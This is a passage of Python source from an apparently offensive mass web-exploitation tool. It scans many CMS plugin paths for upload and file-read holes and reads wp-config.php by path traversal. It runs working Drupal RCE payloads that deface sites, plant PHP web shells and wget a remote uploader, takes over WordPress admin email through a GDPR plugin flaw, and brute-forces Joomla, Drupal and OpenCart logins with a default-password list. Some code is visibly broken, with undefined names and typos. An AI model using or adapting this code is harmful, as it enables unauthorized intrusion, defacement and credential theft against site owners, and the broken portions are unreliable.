            Exp = 'http://' + site + '/wp-content/plugins/formcraft/file-upload/server/content/upload.php'
            Check = requests.get(Exp, timeout=5)
            if '"failed"' in Check.text.encode('utf-8'):
              self.printor('formcraftExploit_Shell',site)
            else:
                self.formcraftExploitIndeX(site)
        except:
            self.formcraftExploitIndeX(site)

    def formcraftExploitIndeX(self, site):
        try:
            Exp = 'http://' + site + '/wp-content/plugins/formcraft/file-upload/server/content/upload.php'
            Check = requests.get(Exp, timeout=5)
            if '"failed"' in Check.text.encode('utf-8'):
                    self.printor('formcraft',site)
            else:
                pass
        except:
            pass
    def cherry_pluginx(self, site):
        try:
            Exp = 'http://' + site + '/wp-content/plugins/cherry-plugin/admin/import-export/upload.php'
            aa = requests.get(Exp, timeout=5)
            if aa.status_code == 200:
                self.printor('cherry plugin',site)
            else:
                pass
        except:
            pass

    def addblockblockerx(self, site):
        try:
            Exp = 'http://' + site + '/wp-admin/admin-ajax.php?action=getcountryuser&cs=2'
            GoT=requests.get(Exp, timeout=5)
            if GoT.status_code == 200:
                self.printor('Adblock Blocker',site)
            else:
                pass
        except:
            pass

    def HeadWayThemeExploitx(self, site):
        try:
            CheckTheme = requests.get('http://' + site, timeout=5)
            if '/wp-content/themes/headway' in CheckTheme.text.encode('utf-8'):
                self.printor('Headway Theme',site)
            else:
                pass
        except:
            pass


    def pagelinesExploitx(self, site):
        try:
            url = "http://" + site + "/wp-admin/admin-post.php"
            GoT = requests.get(url,timeout=5)
            if GoT.status_code == 200:
             self.printor('Pagelines',site)
            else:
                pass
        except:
            pass


    def wysijaExploitx(self, site):
        try:
                Exp = requests.get("http://" + site + "/wp-admin/admin-post.php?page=wysija_campaigns&action=themes", timeout=5)
                if Exp.status_code==200:
                    self.printor('wysijaExploit',site)
                else:
                     pass
        except:
            pass



    def HD_WebPlayerSqlix(self, site):
        try:
            check = requests.get('http://' + site + '/wp-content/plugins/hd-webplayer/playlist.php', timeout=5)
            if '<?xml version="' in check.text.encode('utf-8'):
                self.printor('HD-Webplayer',site)
            else:
                pass
        except:
            pass

    def Gravity_Forms_Shellx(self, site):
        try:
            Grav_checker = requests.get('http://' + site + '/?gf_page=upload', timeout=5)
            if '"status" : "error"' in Grav_checker.text.encode('utf-8'):
                self.printor('Gravity Forms',site)                     
            else:
                pass
        except:
            pass
    def WP_User_Frontendx(self, site):
        try:
            CheckVuln = requests.get('http://' + site + '/wp-admin/admin-ajax.php?action=wpuf_file_upload', timeout=5)
            if 'error' in CheckVuln.text or CheckVuln.status_code == 200:
                 self.printor('WP-User-Frontend',site)
            else:
                pass
        except:
            pass


    def Revslider_css(self, site):
        try:
            Exp = requests.get("http://" + site + "/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css", timeout=5)
            if Exp.status_code==200:
                self.printor('Revslider',site)
            else:
                pass
        except:
            pass

    def Revslider_SHELLx(self, site):
        try:
            CheckRevslider = requests.get('http://' + site, timeout=5)
            if '/wp-content/plugins/revslider/' in CheckRevslider.text.encode('utf-8'):
                self.printor('Revslider',site) 
            elif '/wp-content/themes/Avada/' in CheckRevslider.text.encode('utf-8'):
                self.printor('Avada',site) 
            elif '/wp-content/themes/striking_r/' in CheckRevslider.text.encode('utf-8'):
                self.printor('striking_r',site) 
            elif '/wp-content/themes/IncredibleWP/' in CheckRevslider.text.encode('utf-8'):
                self.printor('IncredibleWP',site) 
            elif '/wp-content/themes/ultimatum/' in CheckRevslider.text.encode('utf-8'):
                self.printor('ultimatum',site) 
            elif '/wp-content/themes/medicate/' in CheckRevslider.text.encode('utf-8'):
                self.printor('medicate',site) 
            elif '/wp-content/themes/centum/' in CheckRevslider.text.encode('utf-8'):
                self.printor('centum',site) 
            elif '/wp-content/themes/beach_apollo/' in CheckRevslider.text.encode('utf-8'):
               self.printor('beach_apollo',site)
            elif '/wp-content/themes/cuckootap/' in CheckRevslider.text.encode('utf-8'):
                self.printor('cuckootap',site)
            elif '/wp-content/themes/pindol/' in CheckRevslider.text.encode('utf-8'):
                self.printor('pindol',site)
            elif '/wp-content/themes/designplus/' in CheckRevslider.text.encode('utf-8'):
               self.printor('designplus',site)
            elif '/wp-content/themes/rarebird/' in CheckRevslider.text.encode('utf-8'):
                self.printor('rarebird',site)

            else:
                    self.Revslider_Config(site)
        except:
            pass

    def Revslider_Config(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5)
            if 'DB_PASSWORD' in GetConfig.text.encode('utf-8'):
                self.printor('Revslider_Config',site)
            else:
                self.Revslider_css(site)
        except:
            pass

    def viral_optinsx(self, site):
        try:
            x = requests.get('http://' + site + '/wp-content/plugins/viral-optins/api/uploader/file-uploader.php',timeout=5)
            if x.status_code==200:
                self.printor('viral optins',site)
            else:
                pass
        except:
            pass


    def Woocomrecex(self, site):
        try:
            Exp = requests.get('http://' + site + '/wp-admin/admin-ajax.php', timeout=5)
            if Exp.status_code==200:
                self.printor('Woocomrece',site)
            else:
                pass
        except:
            pass


    def osCommercex(self, site):
        try:
            CheckVuln = requests.get('http://' + site + '/install/index.php', timeout=5)
            if 'Welcome to osCommerce' in CheckVuln.text.encode('utf-8') or CheckVuln.status_code == 200:
                self.printor('osCommerce RCE',site)
            else:
                pass
        except:
            pass

    def columnadvertsx(self, site):
        try:
         for i in ['/modules/columnadverts2/uploadimage.php','/modules/columnadverts/uploadimage.php']:
            Exp = requests.get(site + i, timeout=5)
            if Exp.status_code==200:
                self.printor('columnadverts',site)
        except:
           pass

    def soopamobilex(self, site):
        try:
            Exp = requests.get(site + '/modules/soopamobile/uploadimage.php', timeout=5)
            if Exp.status_code==200:
                self.printor('soopamobile',site)
            else:
                pass
        except:
            pass


    def soopabannersx(self, site):
        try:
         for i in ['/modules/soopamobile2/uploadproduct.php','/modules/soopabanners/uploadimage.php','/modules/soopamobile2/uploadimage.php']:
            Exp = requests.get(site + i, timeout=5)
            if Exp.status_code==200:
                self.printor('soopabanners',site)
            else:
                pass
        except:
            pass

    def vtermslideshowx(self, site):
        try:
            Exp = requests.get(site + '/modules/vtermslideshow/uploadimage.php', timeout=5)
            if Exp.status_code==200:
                self.printor('vtermslideshow',site)
            else:
                pass
        except:
            pass
    def simpleslideshowx(self, site):
        try:
            Exp = requests.get(site + '/modules/simpleslideshow/uploadimage.php', timeout=5)
            if Exp.status_code==200:
                self.printor('simpleslideshow',site)
            else:
                pass
        except:
            pass

    def productpageadverts(self, site):
        try:
            Exp = requests.get(site + '/modules/productpageadverts/uploadimage.php', timeout=5)
            if Exp.status_code==200:
                self.printor('productpageadverts',site)
            else:
                pass
        except:
            pass

    def homepageadvertisex(self, site):
        try:
            Exp = requests.get(site + '/modules/homepageadvertise/uploadimage.php', timeout=5)
            if Exp.status_code==200:
                self.printor('homepageadvertise',site)
            else:
                pass
        except:
            pass
    def homepageadvertise2x(self, site):
        try:
            Exp = requests.get(site + '/modules/homepageadvertise2/uploadimage.php', timeout=5)
            if Exp.status_code==200:
                self.printor('homepageadvertise2',site)
            else:
                pass
        except:
            pass
    def leosliderlayer(self, site):
        try:
         for i in ['/modules/leosliderlayer/upload_images.php','/modules/leosliderlayer/uploadimage.php']:
            Exp = requests.get(site + i, timeout=5)
            if Exp.status_code==200:
                self.printor('leosliderlayer',site)
            else:
                pass
        except:
            pass
    def vtemskitter(self, site):
        try:
            Exp = requests.get('/modules/vtemskitter/uploadimage.php' + i, timeout=5)
            if Exp.status_code==200:
                self.printor('vtemskitter',site)
            else:
                pass
        except:
            pass
    def jro_homepageadvertisex(self, site):
        try:
         for i in ['/modules/jro_homepageadvertise2//uploadimage.php','/modules/jro_homepageadvertise/uploadimage.php']:
            Exp = requests.get(site + i, timeout=5)
            if Exp.status_code==200:
                self.printor('jro_homepageadvertise',site)
            else:
                pass
        except:
            pass
    def attributewizardprox(self, site):
        try:
            Exp = requests.get(site + '/modules/attributewizardpro/file_upload.php', timeout=5)
            if Exp.status_code==200:
                self.printor('attributewizardpro',site)
            else:
                pass
        except:
            pass

    def filesupload(self, site):
        try:
            Exp = requests.get(site + '/modules/filesupload/upload.php', timeout=5)
            if Exp.status_code==200:
                self.printor('filesupload',site)
            else:
                pass
        except:
            pass

    def attributewizardpro2x(self, site):
        try:
            Exp = requests.get(site + '/modules/1attributewizardpro/file_upload.php', timeout=5)
            if Exp.status_code==200:
                self.printor('attributewizardpro2',site)
            else:
                pass
        except:
            pass

    def attributewizardpro3x(self, site):
        try:
            Exp = requests.get(site + '/modules/attributewizardpro.OLD/file_upload.php', timeout=5)
            if Exp.status_code==200:
                self.printor('attributewizardpro.OLD',site)
            else:
                pass
        except:
            pass
    def attributewizardpro_xx(self, site):
        try:
            Exp = requests.get(site + '/modules/attributewizardpro_x/file_upload.php', timeout=5)
            if Exp.status_code==200:
                self.printor('attributewizardpro_x',site)
            else:
                pass
        except:
            pass
    def advancedsliderx(self, site):
        try:
            Exp = requests.get(site + '/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php', timeout=5)
            if Exp.status_code==200:
                self.printor('advancedslider',site)
            else:
                pass
        except:
            pass
    def cartabandonmentprox(self, site):
        try:
            Exp = requests.get(site + '/modules/cartabandonmentpro/upload.php', timeout=5)
            if Exp.status_code==200:
                self.printor('cartabandonmentpro',site)
            else:
                pass
        except:
            pass
    def cartabandonmentproOldx(self, site):
        try:
            Exp = requests.get(site + '/modules/cartabandonmentproOld/upload.php', timeout=5)
            if Exp.status_code==200:
                self.printor('cartabandonmentproOld',site)
            else:
                pass
        except:
            pass
    def videostabx(self, site):
        try:
            Exp = requests.get(site + '/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload', timeout=5)
            if Exp.status_code==200:
                self.printor('videostab',site)
            else:
                pass
        except:
            pass
    def wg24themeadministrationx(self, site):
        Exl = site + '/modules/wg24themeadministration/wg24_ajax.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5)
            if Checkvuln.status_code == 200:
                self.printor('wg24themeadministration',site)
            else:
                pass
        except:
            pass

    def fieldvmegamenux(self, site):
        Exl = site + '/modules/fieldvmegamenu/ajax/upload.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5)
            if Checkvuln.status_code == 200:
                self.printor('fieldvmegamenu',site)
            else:
                pass
        except:
            pass
    def wdoptionpanelx(self, site):
        Exl = site + '/modules/wdoptionpanel/wdoptionpanel_ajax.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5)
            if Checkvuln.status_code == 200:
                self.printor('wdoptionpanel',site)
            else:
                pass
        except:
            pass

    def pk_flexmenux(self, site):
     for i in ['/modules/pk_flexmenu_old/ajax/upload.php','/modules/pk_flexmenu/ajax/upload.php']:
        Exl = site + i
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5)
            if Checkvuln.status_code == 200:
                    self.printor('pk_flexmenu',site)
            else:
                pass
        except:
            pass

    def nvn_export_ordersx(self, site):
        Exl = site + '/modules/nvn_export_orders/upload.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5)
            if Checkvuln.status_code == 200:
                    self.printor('nvn_export_orders',site)
            else:
                pass
        except:
            pass
    def megamenux(self, site):
        try:
            Exp = requests.get(site + '/modules/megamenu/uploadify/uploadify.php?id=pwn', timeout=5)
            if Exp.status_code==200:
                self.printor('megamenu',site)
            else:
                pass
        except:
            pass

    def tdpsthemeoptionpanelx(self, site):
        Exl = site + '/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5)
            if Checkvuln.status_code == 200:
                self.printor('tdpsthemeoptionpanel',site)
            else:
                pass
        except:
            pass
    def psmodthemeoptionpanelx(self, site):
        Exl = site + '/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5)
            if Checkvuln.status_code == 200:
                self.printor('psmodthemeoptionpanel',site)
            else:
                pass
        except:
            pass
    def libx(self, site):
        Exl = site + '/modules/lib/redactor/file_upload.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5)
            if Checkvuln.status_code == 200:
               self.printor('lib',site)
            else:
                pass
        except:
            pass
    def Com_Jbcatalogx(self, site):
        Check = requests.get('http://' + site + '/components/com_jbcatalog/libraries/jsupload/server/php', timeout=10)
        if Check.status_code == 200:
            self.printor('Com_Jbcatalog',site)
        else:
                pass

    def Com_SexyContactformx(self, site):
        Check = requests.get('http://' + site + '/components/com_sexycontactform/fileupload/', timeout=10)
        if Check.status_code == 200:
            self.printor('Com_SexyContactform',site)
        else:
                pass

    def Com_rokdownloadsx(self, site):
        Check = requests.get('http://' + site + '/administrator/components/com_rokdownloads/assets/uploadhandler.php',
                             timeout=10)
        if Check.status_code == 200 or Check.status_code == 500:
            self.printor('Com_rokdownloads',site)
        else:
                pass

    def wp_miniaudioplayerx(self, site):
        CheckVuln = requests.get('http://' + site, timeout=10)
        if 'wp-miniaudioplayer' in CheckVuln.text.encode('utf-8'):
            self.printor('wp_miniaudioplayer',site)
        else:
                pass

    def wp_support_plus_responsive_ticket_systemx(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/admin/' \
                  'downloadAttachment.php?path=../../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5)
            if 'DB_PASSWORD' in GetConfig.text.encode('utf-8'):
                self.printor('wp-support-plus-responsive-ticket-system',site)
            else:
                pass
        except:
            pass

    def eshop_magicx(self, site):
        try:
            Exp = 'http://' + site + \
                  'wp-content/plugins/eshop-magic/download.php?file=../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5)
            if 'DB_PASSWORD' in GetConfig.text.encode('utf-8'):
                self.printor('eshop_magic',site)
            else:
                pass
        except:
            pass
    def ungalleryx(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/plugins/ungallery/source_vuln.php?pic=../../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5)
            if 'DB_PASSWORD' in GetConfig.text.encode('utf-8'):
                self.printor('ungallery',site)
            else:
                pass
        except:
            pass

    def Com_extplorerx(self, site):
        Check = requests.get('http://' + site + '/administrator/components/com_extplorer/uploadhandler.php',
                             timeout=10)
        if Check.status_code == 200 or Check.status_code == 500:
            elf.printor('Com_extplorer',site)
        else:
                pass
    def Com_jwallpapers_indexx(self, site):
        try:
            Exp = 'http://' + site + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
            if Exp.status_code==200:
                self.printor('Com_jwallpapers',site)
            else:
                pass
        except:
            pass

    def Com_facileformsx(self, site):
        Check = requests.get('http://' + site + '/components/com_facileforms/libraries/jquery/uploadify.php',
                             timeout=10)
        if Check.status_code == 200 or Check.status_code == 500:
                self.printor('Com_facileforms',site)
        else:
                pass
    def barclaycartx(self, site):
        try:
            Exp = 'http://' + site + '/wp-content/plugins/barclaycart/uploadify/uploadify.php'
            if Exp.status_code==200:
                self.printor('barclaycart',site)
            else:
                pass
        except:
            pass



    def Drupal8RCERest(self, site):
        flaga = False
        for Node in range(15):
            if Node == 0:
                Node += 1
            headers = {
                'Content-Type': 'application/hal+json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'
            }
            try:
                cmd = "echo 'Vuln!! Hacked By Mister Spy' > vuln.html"
                Data = r'''{
                    "_links": {
                      "type": { "href": "http://%s/rest/type/shortcut/default"}
                    },
                    "link": [
                      {
                        "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:%d:\"%s\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:%d:\"%s\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}",
                        "value": "link"
                      }
                    ]
                  }''' % (site, len(cmd), cmd, len('system'), 'system')
                try:
                    requests.get('http://{}{}'.format(site, '/node/{}?_format=hal_json'.format(str(Node))),
                                 data=Data, headers=headers, timeout=10)
                    CheckINDEX = requests.get('http://{}/vuln.html'.format(site), timeout=10, headers=self.Headers)
                    if 'Hacked By Mister Spy' in CheckINDEX.content:
                        self.Print_Vuln_index(site + '/vuln.html')
                        with open('Exploited/Index.txt', 'a') as writer:
                            writer.write(site + '/vuln.html' + '\n')
                        flaga = True
                        break
                    else:
                        pass
                except:
                    pass
            except:
                pass
        if flaga == True:
            pass
        else:
            self.Print_NotVuln('Drupal8 RCE', site)

    def wp_gdpr_compliance(self, site):
        try:
            Ex1 = 'http://' + site + '/wp-admin/admin-ajax.php'
            headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            GET = requests.get('http://' + site, headers=headers, timeout=10)
            AjaxTokEN = re.findall('"ajaxSecurity":"(.*)"', GET.text)[0]
            payload = {'action': 'wpgdprc_process_action', 'security': str(AjaxTokEN)}
            payload['data'] = json.dumps({
                'type': 'save_setting',
                'append': False,
                'option': 'new_admin_email',
                'value': self.EMail,
            })
            GG = requests.post(Ex1, timeout=5, headers=headers, data=payload)
            if '{"message":"","error":""}' in GG.text:
                self.AdminTakeOver('WPGDPR', site)
                with open('Exploited/resetpassword.txt', 'a') as writer:
                    writer.write('\n{}/wp-login.php?action=lostpassword --> {}'
                                 ' Success Mr Mahfoud Email Ready To rest Password\n'.format(site, self.EMail))
            else:
                self.Print_NotVuln('wp-gdpr-compliance Exploit', site)
        except:
            self.Print_NotVuln('wp-gdpr-compliance Exploit', site)

    class DrupalGedden2(object):
        def __init__(self, site):
            self.r = '\033[31m'
            self.g = '\033[32m'
            self.y = '\033[33m'
            self.b = '\033[34m'
            self.m = '\033[35m'
            self.c = '\033[36m'
            self.w = '\033[37m'
            self.rr = '\033[39m'
            self.Headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'
            }
            try:
                CheckVersion = requests.get('http://' + site, timeout=5, headers=self.Headers)
                if 'content="Drupal 7' in CheckVersion.text:
                    self.Version7Drupal(site)
                elif 'content="Drupal 8' in CheckVersion.text:
                    self.Version8Drupal(site)
                else:
                    self.Version7Drupal(site)
            except:
                self.Print_NotVuln('Drupalgeddon2', site)

        def Print_NotVuln(self, NameVuln, site):
            print(self.g + '[' + self.g + '>' + self.g + '] '
                  + self.w + site + ' ' + self.g + NameVuln + self.r + ' [Failed]')

        def Print_Vuln_index(self, indexPath):
            print(self.g + '[' + self.g + '>' + self.g + '] '
                  + self.w + indexPath + self.g + ' [Get Index]')

        def Print_vuln_Shell(self, shellPath):
            print(self.g + '[' + self.g + '>' + self.g + '] '
                  + self.w + shellPath + self.g + ' [Get Shell]')

        def Version7Drupal(self, site):
            try:
                payloadshell = "Vuln!!<?php system($_GET['cmd']); ?>"
                PrivatePAyLoad = "echo 'Defaced By Mister Spy!' > vuln.html;" \
                             " echo '" + payloadshell + "'> sites/default/files/vuln.php;" \
                                                        " echo '" + payloadshell + "'> vuln.php;" \
                                                        " cd sites/default/files/;" \
                                                        " echo 'AddType application/x-httpd-php .jpg' > .htaccess;" \
                                                        " wget 'https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php'"
                get_params = {'q': 'user/password', 'name[#post_render][]': 'passthru',
                              'name[#markup]': PrivatePAyLoad, 'name[#type]': 'markup'}
                post_params = {'form_id': 'user_pass', '_triggering_element_name': 'name'}

                r = requests.post('http://' + site, data=post_params, params=get_params, headers=self.Headers)
                m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
                if m:
                    found = m.group(1)
                    get_params = {'q': 'file/ajax/name/#value/' + found}
                    post_params = {'form_build_id': found}
                    requests.post('http://' + site, data=post_params, params=get_params, headers=self.Headers)
                    a = requests.get('http://' + site + '/sites/default/files/vuln.php',
                                     timeout=5, headers=self.Headers)
                    if 'Vuln!!' in a.text:
                        self.Print_vuln_Shell(site + '/sites/default/files/vuln.php?cmd=id')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(site + '/sites/default/files/vuln.php?cmd=id' + '\n')
                        gg = requests.get('http://' + site + '/vuln.html', timeout=5, headers=self.Headers)
                        CheckUploader = requests.get('http://' + site + '/sites/default/files/up.php',
                                                     timeout=5, headers=self.Headers)
                        if 'SpyUploaderV1' in CheckUploader.text:
                            self.Print_vuln_Shell(site + '/sites/default/files/up.php')
                            with open('Exploited/Shells.txt', 'a') as writer:
                                writer.write(site + '/sites/default/files/up.php' + '\n')
                        if 'Defaced By Mister' in gg.text:
                            self.Print_Vuln_index(site + '/vuln.html')
                            with open('Exploited/Index.txt', 'a') as writer:
                                writer.write(site + '/vuln.html' + '\n')
                    else:
                        gg = requests.get('http://' + site + '/vuln.html', timeout=5, headers=self.Headers)
                        if 'Defaced By Mister' in gg.text:
                            self.Print_Vuln_index(site + '/vuln.html')
                            with open('Exploited/Index.txt', 'a') as writer:
                                writer.write(site + '/vuln.html' + '\n')
                            Checkshell = requests.get('http://' + site + '/vuln.php', timeout=5, headers=self.Headers)
                            if 'Vuln!!' in Checkshell.text:
                                self.Print_vuln_Shell(site + '/vuln.php?cmd=id')
                                with open('Exploited/Shells.txt', 'a') as writer:
                                    writer.write(site + '/vuln.php?cmd=id' + '\n')
                        else:
                            self.Print_NotVuln('Drupalgeddon2', site)
                else:
                    self.Print_NotVuln('Drupalgeddon2', site)
            except:
                self.Print_NotVuln('Drupalgeddon2 Timeout!', site)

        def Version8Drupal(self, site):
            try:
                Exp = site + '/user/register/?element_parents=account/' \
                             'mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
                payloadshell = "<?php system($_GET['cmd']); ?>"

                payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
                           'mail[#type]': 'markup', 'mail[#markup]': 'echo Vuln!! Mahfoud patch it Now!> vuln.htm'}

                payload2 = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
                            'mail[#type]': 'markup', 'mail[#markup]': 'echo "' + payloadshell + '"> vuln.php'}
                r = requests.post('http://' + Exp, data=payload, timeout=5, headers=self.Headers)
                if r.status_code == 200:
                    a = requests.get('http://' + site + '/vuln.htm', timeout=5, headers=self.Headers)
                    if 'Vuln!!' in a.text:
                        requests.post('http://' + Exp, data=payload2, timeout=5, headers=self.Headers)
                        CheckShell = requests.get('http://' + site + '/vuln.php', timeout=5, headers=self.Headers)
                        if CheckShell.status_code == 200:
                            self.Print_vuln_Shell(site + '/vuln.php?cmd=id')
                            with open('Exploited/Shells.txt', 'a') as writer:
                                writer.write(site + '/vuln.php?cmd=id' + '\n')
                            self.Print_Vuln_index(site + '/vuln.htm')
                            with open('Exploited/Index.txt', 'a') as writer:
                                writer.write(site + '/vuln.htm' + '\n')
                        else:
                            self.Print_Vuln_index(site + '/vuln.htm')
                            with open('Exploited/Index.txt', 'a') as writer:
                                writer.write(site + '/vuln.htm' + '\n')
                    else:
                        self.Print_NotVuln('Drupalgeddon2', site)
                else:
                    self.Print_NotVuln('Drupalgeddon2', site)
            except:
                self.Print_NotVuln('Drupalgeddon2 Timeout!', site)




    class JooMLaBruteForce(object):
        def __init__(self, site):
            self.flag = 0
            self.r = '\033[31m'
            self.g = '\033[32m'
            self.y = '\033[33m'
            self.b = '\033[34m'
            self.m = '\033[35m'
            self.c = '\033[36m'
            self.w = '\033[37m'
            self.rr = '\033[39m'
            self.password = ["admin", "demo", "admin123", "123456", "123456789", "123", "1234", "12345", "1234567", "12345678",
                        "123456789", "admin1234", "admin123456", "pass123", "root", "321321", "123123", "112233", "102030",
                        "password", "pass", "qwerty", "abc123", "654321", "pass1234", "abc1234", "demo1", "demo2",
                        "demodemo", "site", "shop", "password123", "admin1", "admin12", "adminqwe", "test", "test123", "1",
                        "12", "super123", "superadmin", "temp123", "temp1234", "temporal", "testing", "webmaster", "welcome", "welcome1", "welcome123", "welkom01"]
            thread = []
            for passwd in self.password:
                t = threading.Thread(target=self.Joomla, args=(site, passwd))
                if self.flag == 1:
                    break
                else:
                    t.start()
                    thread.append(t)
                    time.sleep(0.08)
            for j in thread:
                j.join()
            if self.flag == 0:
                print(self.g + '[' + self.g + '>' + self.g + '] ' + self.w +'http://' + site + ' '
                      + self.g + ' [Joomla BruteForce]' + self.r + ' [Failed]')

        def Joomla(self, site, passwd):
            try:
                agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                sess = requests.session()
                GetToken = sess.get('http://' + site + '/administrator/index.php', timeout=5, headers=agent)
                try:
                    ToKeN = re.findall('type="hidden" name="(.*)" value="1"',
                                       GetToken.text)[0]
                    GeTOPtIoN = re.findall('type="hidden" name="option" value="(.*)"', GetToken.text)[0]
                except:
                    ToKeN = ''
                    GeTOPtIoN = 'com_login'
                post = {}
                post['username'] = "admin"
                post['passwd'] = passwd
                post['lang'] = 'en-GB'
                post['option'] = GeTOPtIoN
                post['task'] = 'login'
                post[ToKeN] = '1'
                url = "http://" + site + "/administrator/index.php"
                GoT = sess.post(url, data=post, headers=agent, timeout=10)
                if 'logout' in GoT.text and '/index.php?option=com_users&amp;task=user.edit' in GoT.text:
                    print(self.g + '[' + self.g + '>' + self.g + '] ' +\
                          self.w + 'http://' + site + ' ' + ' ' + self.g + '[Joomla]' + self.g + ' [Done]')
                    with open('Exploited/BruteForce.txt', 'a') as writer:
                        writer.write('http://' + site + '/administrator/index.php' + '\n Username: admin' +
                                     '\n Password: ' + passwd + '\n\n')
                    self.flag = 1
            except:
                pass

    class DrupalBruteForce(object):
        def __init__(self, site):
            self.flag = 0
            self.r = '\033[31m'
            self.g = '\033[32m'
            self.y = '\033[33m'
            self.b = '\033[34m'
            self.m = '\033[35m'
            self.c = '\033[36m'
            self.w = '\033[37m'
            self.rr = '\033[39m'
            self.password = ["admin", "demo", "admin123", "123456", "123456789", "123", "1234", "12345", "1234567", "12345678",
                        "123456789", "admin1234", "admin123456", "pass123", "root", "321321", "123123", "112233", "102030",
                        "password", "pass", "qwerty", "abc123", "654321", "pass1234", "abc1234", "demo1", "demo2",
                        "demodemo", "site", "shop", "password123", "admin1", "admin12", "adminqwe", "test", "test123", "1",
                        "12", "123123", "super123", "superadmin", "temp123", "temp1234", "temporal", "testing", "webmaster", "welcome", "welcome1", "welcome123", "welkom01"]
            thread = []
            for passwd in self.password:
                t = threading.Thread(target=self.Drupal, args=(site, passwd))
                if self.flag == 1:
                    break
                else:
                    t.start()
                    thread.append(t)
                    time.sleep(0.08)
            for j in thread:
                j.join()
            if self.flag == 0:
                print(self.g + '[' + self.g + '>' + self.g + '] ' + self.w + 'http://' + site + ' ' + ' ' \
                      + self.g + '[Drupal BruteForce]' + self.r + ' [Failed]')

        def Drupal(self, site, passwd):
            try:
                agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                sess = requests.session()
                GetToken = sess.get('http://' + site + '/user/login', timeout=5, headers=agent)
                try:
                    GetOP = re.findall('id="edit-submit" name="op" value="(.*)"',
                                       GetToken.text)[0].split('"')[0]
                except:
                    GetOP = 'Log in'
                post = {}
                post['name'] = "admin"
                post['pass'] = passwd
                post['form_id'] = 'user_login'
                post['op'] = GetOP
                url = "http://" + site + "/user/login"
                GoT = sess.post(url, data=post, headers=agent, timeout=10)
                if 'Log out' in GoT.text:
                    print(self.g + '[' + self.g + '>' + self.g + '] ' +\
                          self.w + site + ' ' + self.g + '[Drupal]' + self.g + ' [Done]')
                    with open('Exploited/BruteForce.txt', 'a') as writer:
                        writer.write('http://' + site + '/user/login' + '\n Username: admin' + '\n Password: ' +
                                     passwd + '\n\n')
                    self.flag = 1
            except:
                pass

    class OpenCart(object):
        def __init__(self, site):
            self.flag = 0
            self.r = '\033[31m'
            self.g = '\033[32m'
            self.y = '\033[33m'
            self.b = '\033[34m'
            self.m = '\033[35m'
            self.c = '\033[36m'
            self.w = '\033[37m'
            self.rr = '\033[39m'
            self.password = ["admin", "demo", "admin123", "123456", "123456789", "123", "1234", "12345", "1234567", "12345678",
                        "123456789", "admin1234", "admin123456", "pass123", "root", "321321", "123123", "112233", "102030",
                        "password", "pass", "qwerty", "abc123", "654321", "pass1234", "abc1234", "demo1", "demo2",
                        "demodemo", "site", "shop", "password123", "admin1", "admin12", "adminqwe", "test", "test123", "1",
                        "12", "123123", "super123", "superadmin", "temp123", "temp1234", "temporal", "testing", "webmaster", "welcome", "welcome1", "welcome123", "welkom01"]
            thread = []
            for passwd in self.password:
                t = threading.Thread(target=self.opencart, args=(site, passwd))
                if self.flag == 1:
                    break
                else:
                    t.start()
                    thread.append(t)
                    time.sleep(0.08)
            for j in thread:
                j.join()
            if self.flag == 0:
                print(self.c + '[' + self.y + '>' + self.g + '] ' + self.r + 'http://' + site + ' ' + ' ' \
                      + self.g + '[OpenCart BruteForce]' + self.r + ' [Failed]')

        def opencart(self, site, passwd):
            try:
                agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                post = {}
                post['username'] = "admin"
                post['password'] = passwd
                url = "http://" + site + "/admin/index.php"
